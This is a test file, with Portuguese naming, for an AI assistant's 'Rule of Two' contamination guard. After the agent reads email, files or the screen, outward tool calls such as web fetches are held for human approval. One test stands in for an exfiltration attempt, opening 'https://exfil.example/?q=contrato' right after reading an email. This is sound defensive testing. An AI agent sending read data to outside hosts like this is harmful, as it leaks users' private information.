import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { z } from "zod";
import type { ToolDef } from "../tools/registry";

/**
 * A Regra de Dois (PRD §2.8) fora da bancada: o que é fonte, o que é saída, e
 * o turno SEM objeto (a voz em tempo real, a conversa "Eu" chamada pelo
 * despacho), em que cada função chega numa chamada própria ao registro e a
 * marca é achada pela chave do usuário e do canal, dentro da janela.
 */

const { executarChamada } = await import("../tools/registry");
const { _limparContaminacao, chaveDoTurno, criarContaminacao, devolveuConteudo, ehFonteSensivel, leuNosPassos, novoTurno, saiParaFora } = await import("./contaminacao");

const lido: string[] = [];
const ler: ToolDef = { name: "ler_email", domain: "anexos", description: "x", risk: "leitura", inputSchema: z.object({}), run: async () => ({ corpo: "<dado_externo>o contrato</dado_externo>" }) };
const pagina: ToolDef = { name: "ler_pagina", domain: "web", description: "x", risk: "leitura", inputSchema: z.object({ url: z.string() }), run: async (i: { url: string }) => (lido.push(i.url), { conteudo: "ok" }) };

const fila: { tool: string; risco: unknown; resumo: string }[] = [];
const enqueue = async (def: { name: string }, entrada: unknown, resumo: string) => {
  fila.push({ tool: def.name, risco: (entrada as { risco?: unknown }).risco, resumo });
  return { proposta_enfileirada: true as const, aguardando_aprovacao: true as const, id: "a1", resumo };
};
const guarda = { executar: async (c: { run: () => Promise<unknown> }) => c.run(), enfileirada: async () => undefined, recusada: async () => undefined };
const politica = criarContaminacao(async () => ({ ligada: true, janelaMs: 60_000 }));
const opts = { enqueue, guarda, contaminacao: politica };

beforeEach(() => {
  _limparContaminacao();
  lido.length = 0;
  fila.length = 0;
});
afterEach(() => vi.useRealTimers());

describe("o que é fonte e o que é saída", () => {
  it("fontes: arquivos, terminal, a tela com texto e o e-mail; CPU e cursor não", () => {
    expect(ehFonteSensivel({ name: "arquivos_ler", domain: "arquivos" }, { acao: "listar" })).toBe(true);
    expect(ehFonteSensivel({ name: "terminal_executar", domain: "terminal" }, { comando: "git status" })).toBe(true);
    expect(ehFonteSensivel({ name: "terminal_sessao", domain: "terminal" }, { acao: "ler" })).toBe(true);
    expect(ehFonteSensivel({ name: "computador_ver", domain: "computador" }, {})).toBe(true);
    expect(ehFonteSensivel({ name: "computador_ver", domain: "computador" }, { acao: "janelas" })).toBe(true);
    expect(ehFonteSensivel({ name: "computador_ver", domain: "computador" }, { acao: "sistema" })).toBe(false);
    expect(ehFonteSensivel({ name: "computador_ver", domain: "computador" }, { acao: "cursor" })).toBe(false);
    expect(ehFonteSensivel({ name: "ler_anexo", domain: "anexos" }, {})).toBe(true);
    expect(ehFonteSensivel({ name: "ler_email", domain: "anexos" }, {})).toBe(true);
    expect(ehFonteSensivel({ name: "clima_agora", domain: "clima" }, {})).toBe(false);
  });

  it("saídas: web, envio a terceiros, abrir URL no Chrome e no Windows; ler a aba aberta e áudio para o dono não", () => {
    expect(saiParaFora({ name: "ler_pagina", domain: "web" }, { url: "https://x" })).toBe(true);
    expect(saiParaFora({ name: "pesquisar_web", domain: "web" }, { consulta: "x" })).toBe(true);
    expect(saiParaFora({ name: "enviar_email", domain: "email" }, {})).toBe(true);
    expect(saiParaFora({ name: "responder_whatsapp", domain: "whatsapp" }, {})).toBe(true);
    expect(saiParaFora({ name: "responder_em_audio", domain: "whatsapp" }, {})).toBe(false);
    expect(saiParaFora({ name: "navegador_abrir", domain: "navegador" }, { url: "https://x" })).toBe(true);
    expect(saiParaFora({ name: "navegador_abrir", domain: "navegador" }, { acao: "voltar" })).toBe(false);
    expect(saiParaFora({ name: "navegador_agir", domain: "navegador" }, {})).toBe(true);
    expect(saiParaFora({ name: "navegador_ler", domain: "navegador" }, { acao: "ler" })).toBe(false);
    expect(saiParaFora({ name: "navegador_ler", domain: "navegador" }, { url: "https://x/?q=1" })).toBe(true);
    expect(saiParaFora({ name: "computador_abrir", domain: "computador" }, { tipo: "url", alvo: "https://x" })).toBe(true);
    expect(saiParaFora({ name: "computador_abrir", domain: "computador" }, { tipo: "app", alvo: "excel" })).toBe(false);
    expect(saiParaFora({ name: "registrar_gasto", domain: "financas" }, {})).toBe(false);
  });

  it("conteúdo: recusa, erro, proposta e leitura em segundo plano não contam", () => {
    expect(devolveuConteudo({ texto: "x" })).toBe(true);
    expect(devolveuConteudo("saída")).toBe(true);
    expect(devolveuConteudo({ permitido: false, erro: "não" })).toBe(false);
    expect(devolveuConteudo({ erro: "falhou" })).toBe(false);
    expect(devolveuConteudo({ proposta_enfileirada: true })).toBe(false);
    expect(devolveuConteudo({ lendo_em_segundo_plano: true })).toBe(false);
    expect(devolveuConteudo("")).toBe(false);
    expect(devolveuConteudo(null)).toBe(false);
  });

  it("leuNosPassos acha a leitura sensível nos passos do turno (para a busca nativa)", () => {
    const dominio = (n: string) => ({ arquivos_ler: "arquivos", ler_pagina: "web" })[n];
    expect(leuNosPassos([{ toolResults: [{ toolName: "ler_pagina", input: {}, output: { conteudo: "x" } }] }], dominio)).toBeNull();
    expect(leuNosPassos([{ toolResults: [{ toolName: "arquivos_ler", input: { acao: "ler" }, output: { permitido: false, erro: "pasta" } }] }], dominio)).toBeNull();
    expect(leuNosPassos([{ toolResults: [{ toolName: "arquivos_ler", input: { acao: "ler" }, output: { texto: "x" } }] }], dominio)?.tool).toBe("arquivos_ler");
  });
});

describe("turno sem objeto (voz e despacho): a marca vale pela chave, dentro da janela", () => {
  it("voz: ler o e-mail numa chamada e abrir a página em outra vira proposta", async () => {
    await executarChamada(ler, {}, { userId: "dono", canal: "voz" }, opts);
    const r = (await executarChamada(pagina, { url: "https://exfil.example/?q=contrato" }, { userId: "dono", canal: "voz" }, opts)) as { proposta_enfileirada?: boolean };
    expect(r.proposta_enfileirada).toBe(true);
    expect(lido).toEqual([]);
    expect(fila).toMatchObject([{ tool: "ler_pagina", risco: "efeito_externo", resumo: expect.stringContaining("com ler_email") }]);
  });

  it("controle: sem a leitura antes, a voz abre a página direto", async () => {
    await executarChamada(pagina, { url: "https://docs.example/a" }, { userId: "dono", canal: "voz" }, opts);
    expect(lido).toEqual(["https://docs.example/a"]);
    expect(fila).toEqual([]);
  });

  it("passada a janela, a trava cai", async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date("2026-10-11T12:00:00Z"));
    await executarChamada(ler, {}, { userId: "dono", canal: "whatsapp" }, opts);
    vi.setSystemTime(new Date("2026-10-11T12:00:59Z"));
    await executarChamada(pagina, { url: "https://x.example/1" }, { userId: "dono", canal: "whatsapp" }, opts);
    expect(lido).toEqual([]);
    vi.setSystemTime(new Date("2026-10-11T12:01:01Z"));
    await executarChamada(pagina, { url: "https://x.example/2" }, { userId: "dono", canal: "whatsapp" }, opts);
    expect(lido).toEqual(["https://x.example/2"]);
  });

  it("canal, conversa e pessoa diferentes não se contaminam", async () => {
    await executarChamada(ler, {}, { userId: "dono", canal: "voz" }, opts);
    await executarChamada(pagina, { url: "https://a.example" }, { userId: "dono", canal: "tela", turno: novoTurno("dono", "tela", { id: "conversa-1" }) }, opts);
    await executarChamada(pagina, { url: "https://b.example" }, { userId: "outra", canal: "voz" }, opts);
    expect(lido).toEqual(["https://a.example", "https://b.example"]);
  });

  it("com o objeto do turno, a trava vale o turno inteiro, mesmo depois da janela", async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date("2026-10-11T12:00:00Z"));
    const turno = novoTurno("dono", "tela", { id: "c1" });
    await executarChamada(ler, {}, { userId: "dono", canal: "tela", turno }, opts);
    vi.setSystemTime(new Date("2026-10-11T12:10:00Z"));
    await executarChamada(pagina, { url: "https://x.example" }, { userId: "dono", canal: "tela", turno }, opts);
    expect(lido).toEqual([]);
    expect(turno.leitura?.tool).toBe("ler_email");
  });

  it("leitura que falhou não trava nada", async () => {
    const falha: ToolDef = { ...ler, run: async () => ({ erro: "Não achei esse e-mail." }) };
    await executarChamada(falha, {}, { userId: "dono", canal: "voz" }, opts);
    await executarChamada(pagina, { url: "https://x.example" }, { userId: "dono", canal: "voz" }, opts);
    expect(lido).toEqual(["https://x.example"]);
  });

  it("desligada na tela, nada muda", async () => {
    const desligada = { ...opts, contaminacao: criarContaminacao(async () => ({ ligada: false, janelaMs: 60_000 })) };
    await executarChamada(ler, {}, { userId: "dono", canal: "voz" }, desligada);
    await executarChamada(pagina, { url: "https://x.example" }, { userId: "dono", canal: "voz" }, desligada);
    expect(lido).toEqual(["https://x.example"]);
  });

  it("a chave começa pelo usuário", () => {
    expect(chaveDoTurno("dono", "voz")).toBe("dono|voz||");
    expect(chaveDoTurno("dono", undefined, "rotina", "x")).toBe("dono|tela|rotina|x");
  });
});
